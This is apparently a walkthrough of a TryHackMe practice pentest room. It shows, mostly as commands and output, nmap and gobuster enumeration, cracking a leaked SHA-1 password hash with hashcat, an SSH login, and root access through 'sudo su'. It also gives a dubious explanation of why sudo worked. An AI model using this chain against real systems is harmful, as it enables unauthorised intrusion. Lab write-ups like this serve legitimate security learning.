# Intro

This writeup is THM's CC:Pentest Room's Final Exam's walkthrough which can be found [here](https://tryhackme.com/room/ccpentesting). The objective is to figure out the user flag and root flag.

**Tools used**: Nmap, Gobuster, Hashcat, Privilege Escalation. 

# Analysis

## Nmap

For information gathering and enumeration, I started off with an NMAP stealth scan.

```cli
nmap -p- -v --min-parallelism 100 -sV 10.10.24.168
```
Here, *-p-* scans all 65,535 ports, *-v* is a verbose flag, *--min-parallelism* probes parallelism to speed up the scan and *-sV* shows the version of services running on the target IP.

The results of the scan returned as follows

```cli
Nmap scan report for 10.10.24.168
Host is up (0.31s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
62157/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So there's 2 ports open with SSH and Apache. We'll come back to this later, if needed. 

## GoBuster

Gobuster is a directory bruteforcing tool that will search for hidden directories on the port 80 web server. Let's run the code below to see what it outputs

```cli
gobuster dir -u 10.10.24.168 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

The output was 
```cli
===============================================================
2020/10/21 22:27:08 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
2020/10/21 22:31:48 Finished
===============================================================
```

Aha! There's a directory called 'secret' on the server. However, there's nothing displayed if I visit it and nothing interesting in the source too. So I had to run gobuster on it again under that directory.

```cli
gobuster dir -u 10.10.24.168/secret -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

And this time I found

```cli
/index.html (Status: 200)
```

Nothing again, but the hint says check for different extensions so let's check with other extensions like .txt.

```cli
gobuster dir -u 10.10.24.168/secret -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .txt
```

This shows a 'secret.txt' file. When I open this, I see

```cli
nyan:046385855FC9580393853D8E81F240B66FE9A7B8
```

Which seem like the credentials for the SSH client from the earlier NMAP scan. Let's use this to connect to the SSH server.

```cli
ssh nyan@10.10.24.168
```
But if I use the default password seen above, it doesn't work. As I suspected, this password is hashed. So I used *hashid* to verify the hash being used.

```cli
hashid 046385855FC9580393853D8E81F240B66FE9A7B8
```
And the results pointed it out to be SHA-1

To crack this, let's use *hashcat* as below.

```cli
hashcat -m 100 hash /usr/share/wordlists/rockyou.txt --force
```

The *-m* flag sets the mode to 100 which pertains to SHA-1 and *hash* is a text file I stored the hash digest in.

The results of this crack were as follows:

```cli
046385855fc9580393853d8e81f240b66fe9a7b8:[redacted]
Session..........: hashcat
Status...........: Cracked

Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1

```

Success! The SSH password is as seen above next to the hash.
Let's use that to login to the SSH server.

## User

After logging in, running *ls* gives us the user flag.

```cli
nyan@ubuntu:~$ ls
user.txt
nyan@ubuntu:~$ cat user.txt
[redacted]
nyan@ubuntu:~$ 
```

Now onto the root flag!

If I run 

```cli
nyan@ubuntu:~$ ls -latr
total 36
drwxr-xr-x 3 root root 4096 Dec 20  2019 ..
-rw-r--r-- 1 nyan nyan  655 Dec 20  2019 .profile
-rw-r--r-- 1 nyan nyan 3771 Dec 20  2019 .consolerc
-rw-r--r-- 1 nyan nyan  220 Dec 20  2019 .console_logout
drwx------ 2 nyan nyan 4096 Dec 20  2019 .cache
-rw-r--r-- 1 nyan nyan    0 Dec 20  2019 .sudo_as_admin_successful
drwxrwxr-x 2 nyan nyan 4096 Dec 20  2019 .nano
-rw-rw-r-- 1 nyan nyan   14 Dec 20  2019 user.txt
-rw------- 1 nyan nyan   16 Dec 20  2019 .console_history
drwxr-xr-x 4 nyan nyan 4096 Dec 20  2019 .
```
## Root

There's a hidden file, console_history, opening it, I saw 3 lines of previous history.

```cli
su
sudo su
exit
```

When I run the second line, I successfully entered root.
It seems that *sudo* had the SUID bit set on it.

```cli
nyan@ubuntu:~$ sudo su
root@ubuntu:/home/nyan# whoami
root
root@ubuntu:/home/nyan# 
```

And so

```cli
root@ubuntu:/home/nyan# cd ../..
root@ubuntu:/# cd root
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt
[redacted]
```

We have successfully found the root flag and thereby finished this exam. 

## *Thanks for following along.*
